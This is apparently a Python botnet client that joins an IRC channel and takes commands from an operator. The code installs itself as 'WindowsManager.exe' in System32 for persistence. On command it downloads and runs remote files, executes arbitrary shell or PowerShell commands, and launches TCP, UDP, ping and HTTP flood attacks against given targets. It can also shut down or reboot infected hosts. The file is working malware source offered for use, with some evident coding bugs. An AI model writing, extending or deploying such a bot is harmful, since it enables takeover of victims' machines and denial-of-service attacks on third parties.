from socket import AF_INET,SOCK_STREAM,socket
from protocol.ddos import protocols_ddos
from protocol.exec_download import download_exec
from protocol.browser import open_page
from protocol.get_os import os_get
from protocol.start_up import up_start
from secrets import token_hex
from threading import Thread
from time import time,sleep
from os import system
from sys import argv
from sys import exit





class IRC_BOT(Thread,object):
    def __init__(self) -> None:
        self.socket = socket(AF_INET, SOCK_STREAM)
        pass

    def send(self, channel, msg):

        self.socket.send(bytes("PRIVMSG " + channel + " " + msg + "\n","UTF-8"))




    def get_response(self):
        sleep(1)

        resp = self.socket.recv(2040).decode("UTF-8")





    def connect(self,server=str(),port=int(),channel=str(),botnick=str()):

        try:

            self.socket.connect((server, port))


            self.socket.send(bytes("USER " + botnick + " " + botnick +" " + botnick + " :python\n", "UTF-8"))
            self.socket.send(bytes("NICK " + botnick + "\n", "UTF-8"))
            data = self.socket.recv(2040).decode("UTF-8")

            threshold = 5 * 60 
            if up_start('WindowsManager','C:\\Windows\\System32\\WindowsManager.exe') == None:
                pass


            last_ping = time.time()

        except OSError or ConnectionRefusedError or TimeoutError:
                while True:
                    sleep(2*60)
                    try:
                        ax = system("powershell.exe $ax = Get-NetAdapter ;$ar = Out-String -InputObject $ax;if ($ar -like '**Up**') {return $true}")
                        if ax == True:
                            self.connect(server,port,channel,botnick)
                    except OSError or Exception:
                        pass



        while True:
            try:
                data = self.socket.recv( 4096 ).decode('UTF-8')
                if data.find ( 'Nickname is already in use' ) != -1:
                    NICK = botnick + str(time.time())
                    self.connect(server,6667,port,botnick)

                if data.find ('PING') != -1:
                    self.socket.send('PONG'.encode() + data.split()[1].encode() + '\r\n'.encode() )
                    last_ping = time.time()
                if (time.time() - last_ping) > threshold:
                    break

                self.socket.send("JOIN".encode() + channel.encode()+ "\n".encode())



                if '!up'in data:
                    self.socket.send(bytes("PRIVMSG " + channel + " " + 'UP!' + "\n", "UTF-8"))



                if 'exec_win' in data:
                    try:
                        if botnick.find('Win') != -1:
                            a = data.split('!exec_win')[1]
                            url = a.split(' ')[1]# url to donwload it
                            file = a.split(' ')[2] # name of file to execute
                            if download_exec(url) == None:
                                if up_start(str(token_hex(nbytes=3)),'C:\\Windows\\System32\\'+file) == None:
                                    self.socket.send(bytes("PRIVMSG " + channel + " " + 'SENT!' + "\n", "UTF-8"))


                    except:
                        self.socket.send(bytes("PRIVMSG " + channel + " " + '!exec_url_type_software' + "\n", "UTF-8"))


                #cercare in directory i browser e se vi sono usare la directory per aprire il browser
                if '!open_web_page' in data:
                    try:
                        a = data.split('!open_web_page')[1]
                        url = a.split(' ')[1]
                        if open_page(url) == None:
                            self.socket.send('OPENED!')
                    except:
                        self.socket.send(bytes("PRIVMSG " + channel + " " + 'ERROR!' + "\n", "UTF-8"))

                if '!tcpflood' in data:
                    try:
                        a = data.split('!tcpflood')[1]
                        ip = a.split(' ')[1]
                        port = a.split(' ')[2]
                        timeout = a.split(' ')[3]
                        if protocols_ddos(tcp=True,ip=ip,port=port,time=timex) == None:
                            self.socket.send(bytes("PRIVMSG " + channel + " " + 'SENT!' + "\n", "UTF-8"))
                    except:
                        self.socket.send(bytes("PRIVMSG " + channel + " " + '!tcpflood_ip_port_time' + "\n", "UTF-8"))


                if '!udpflood' in data:
                    try:
                        a = data.split('!udpflood')[1]
                        ip = a.split(' ')[1]
                        port = a.split(' ')[2]
                        timex = a.split(' ')[3]
                        if protocols_ddos(udp=True,ip=ip,port=port,time=timex) == None:
                            self.socket.send(bytes("PRIVMSG " + channel + " " + 'SENT!' + "\n", "UTF-8"))
                    except:
                        self.socket.send(bytes("PRIVMSG " + channel + " " + '!udpflood_ip_time' + "\n", "UTF-8"))





                if '!pingflood' in data:
                    try:
                        a = data.split('!pingflood')[1]
                        ip = a.split(' ')[1]
                        timex = a.split(' ')[2]
                        if protocols_ddos(ping=True,ip=ip,port=port,time=timex) == None:
                            self.socket.send(bytes("PRIVMSG " + channel + " " + 'SENT!' + "\n", "UTF-8"))
                    except:
                        self.socket.send(bytes("PRIVMSG " + channel + " " + '!pingflood_ip_time' + "\n", "UTF-8"))

                if '!httpflood' in data:
                    try:
                        a = data.split('!httpflood')[1]
                        ip = a.split(' ')[1]
                        timex = a.split(' ')[2]
                        if protocols_ddos(get=True,ip=ip,time=timex) == None:
                            self.socket.send(bytes("PRIVMSG " + channel + " " + 'SENT!' + "\n", "UTF-8"))
                    except:
                        self.socket.send(bytes("PRIVMSG " + channel + " " + '!httpflood_url_time' + "\n", "UTF-8"))


                if '!shutdown' in data:
                    if botnick.find('Win') != -1:
                        try:
                            system('powershell.exe shutdown /s')
                        except:
                            pass
                    if botnick.find('Linux')  != -1:
                        try:
                            system('poweroff')
                        except:
                            pass

                if '!restart' in data:
                    if botnick.find('Win') != -1:
                        try:
                            system('powershell.exe  shutdown /r')
                        except:
                            pass
                    if botnick.find('Linux')  != -1:
                        try:
                            system('reboot')
                        except:
                            pass
                
                if '!disconnect' in data:
                    if botnick.find('Win') != -1:
                        try:
                            system('powershell.exe shutdown /l')
                        except:
                            pass
                    if botnick.find('Linux')  != -1:
                        pass

                if '!shell' in data:
                    try:
                        upx = ''
                        ax = data.split(' ')[1:]
                        for ii in ax:
                            upx+=ii
                            upx+=' ' 
                    except:
                        self.socket.send(bytes("PRIVMSG " + channel + " " + '!shell_command_command' + "\n", "UTF-8"))
        
                    if botnick.find('Win') != -1:
                        try:
                            system('powershell.exe '+upx)
                            self.socket.send(bytes("PRIVMSG " + channel + " " + 'EXECUTED SHELL!' + "\n", "UTF-8"))
                        except Exception:
                            self.socket.send(bytes("PRIVMSG " + channel + " " + '!shell' + "\n", "UTF-8"))
                    if botnick.find('Linux')  != -1:
                        system(upx)

                if '!dead' in data:
                    self.socket.send(bytes("PRIVMSG " + channel + " " + 'BYE!' + "\n", "UTF-8"))
                    sleep(3);exit(1)




            except OSError or ConnectionRefusedError or TimeoutError:
                pass



#=================================================================================================================================

# server, port, channel, botnick

obj = IRC_BOT()

try:
    obj.connect(server=argv[1],port=argv[2],channel=argv[3],botnick=os_get().select_name())
except Exception:
    print('Select three parameters that are ip/port/channel of irc server\n\n\nEXAMPLE: python3 irc_bot.py 127.0.0.1 6667 #BotNet')
    exit(1)


